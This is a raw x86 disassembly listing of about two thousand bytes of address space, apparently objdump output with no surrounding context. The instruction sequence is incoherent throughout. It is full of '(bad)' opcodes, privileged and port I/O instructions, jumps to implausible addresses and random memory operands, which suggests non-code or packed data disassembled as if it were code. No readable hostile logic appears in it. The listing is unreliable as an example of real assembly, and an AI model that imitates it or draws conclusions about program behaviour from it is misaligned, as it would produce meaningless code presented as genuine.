  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
